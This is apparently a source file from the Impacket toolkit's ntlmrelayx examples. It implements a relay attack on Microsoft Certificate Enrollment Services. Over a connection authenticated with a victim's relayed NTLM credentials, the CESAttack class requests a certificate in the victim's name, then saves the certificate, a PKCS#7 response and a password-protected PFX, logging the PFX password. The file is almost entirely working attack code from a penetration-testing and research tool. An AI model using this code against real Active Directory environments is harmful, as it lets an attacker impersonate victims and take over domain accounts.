# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Microsoft Certificate Enrollment Services (CES/WSTEP) relay attack.

from impacket import LOG
from impacket.examples.ntlmrelayx.utils.ces import (
    CES_MAX_RESPONSE,
    CES_TEMPLATE_DEFAULT,
    allocate_artifact_paths,
    build_ces_soap,
    create_encrypted_pfx,
    decode_certificate,
    decode_pkcs7,
    extract_response_tokens,
    generate_csr,
    secure_write,
    soap_http_headers,
    target_url,
)


class CESAttack:
    @staticmethod
    def _read_response(response):
        body = response.read(CES_MAX_RESPONSE + 1)
        if len(body) > CES_MAX_RESPONSE:
            # Drain the connection without retaining additional untrusted data.
            while response.read(65536):
                pass
            raise RuntimeError("CES response exceeds the %d-byte limit" % CES_MAX_RESPONSE)
        return body

    def _run(self):
        identity = "%s\\%s" % (self.domain, self.username) if self.domain else self.username
        template = self.config.template or CES_TEMPLATE_DEFAULT
        try:
            csr_b64, key = generate_csr(identity)
            url = target_url(self.target, self.relay_client)
            soap = build_ces_soap(url, csr_b64, template)
            body = soap.encode("utf-8")
            path = self.relay_client.path or "/"
            if self.relay_client.query:
                path += "?" + self.relay_client.query

            LOG.info("Requesting a certificate for %s using CES template %s", identity, template)
            # self.client is the already authenticated HTTP(S) connection.
            self.client.request("POST", path, body=body, headers=soap_http_headers(len(body)))
            response = self.client.getresponse()
            response_body = self._read_response(response)
            if response.status >= 400:
                diagnostic = response_body[:2000].decode("utf-8", errors="replace")
                raise RuntimeError("CES returned HTTP %d %s: %s" % (response.status, response.reason, diagnostic))

            cert_tokens, p7b_tokens = extract_response_tokens(response_body)
            cert_der = certificate = None
            p7b_der = None
            if cert_tokens:
                cert_der, certificate = decode_certificate(cert_tokens[-1])
            if p7b_tokens:
                p7b_der = decode_pkcs7(p7b_tokens[0])

            paths = allocate_artifact_paths(self.config.cesOutputDir, identity)
            if cert_der is not None:
                secure_write(paths["cer"], cert_der)
                LOG.info("Saved issued CES certificate: %s", paths["cer"])
            else:
                LOG.warning("CES response did not contain an X509v3 certificate; PFX was not created")

            if p7b_der is not None:
                secure_write(paths["p7b"], p7b_der)
                LOG.info("Saved CES PKCS#7 response: %s", paths["p7b"])
            else:
                LOG.warning("CES response did not contain a PKCS#7 token")

            if certificate is not None:
                pfx, password = create_encrypted_pfx(certificate, key)
                secure_write(paths["pfx"], pfx)
                LOG.info("Saved password-encrypted CES PFX: %s", paths["pfx"])
                LOG.info("CES PFX password (sensitive): %s", password)
        except Exception as exc:
            LOG.error("CES SOAP enrollment failed: %s", exc)
